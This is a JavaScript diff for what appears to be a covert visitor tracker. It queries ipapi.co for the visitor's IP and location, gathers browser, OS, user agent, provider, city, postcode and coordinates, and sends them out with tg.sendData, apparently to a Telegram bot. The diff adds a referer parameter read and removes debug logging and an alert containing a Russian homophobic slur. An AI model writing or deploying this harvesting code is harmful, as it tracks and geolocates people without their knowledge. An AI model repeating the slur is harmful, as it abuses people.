@@ -8,6 +8,11 @@ const request = async () => { // Calling a "synchronous" fetch
     const response = await fetch('https://ipapi.co/json/');
     const data = await response.json();
 
+    const url = new URL(window.location);
+    const referer = url.searchParams.get("referer");
+
+    console.log(referer);
+
     // Declaring variables
 	let time = new Date().toLocaleString('de-DE', { timeZone: 'UTC' });
 	let userTime = new Date().toLocaleString('de-DE');
@@ -57,26 +62,8 @@ const request = async () => { // Calling a "synchronous" fetch
 	["latitude", lat],
 	["longitude", lon]
     ]);
-
-	/* console.log(time);
-	console.log(userTime);
-	console.log(browser);
-	console.log(os);
-	console.log(useragent);
-    console.log(ip);
-    console.log(provider);
-    console.log(timezone);
-    console.log(language);
-    console.log(country);
-    console.log(countryCode);
-    console.log(region);
-    console.log(city);
-    console.log(zip);
-    console.log(lat);
-    console.log(lon); */
-
+	
     const log = mapToJSON(map);
-alert("ты пидераст");
     tg.sendData(log);
 }
 
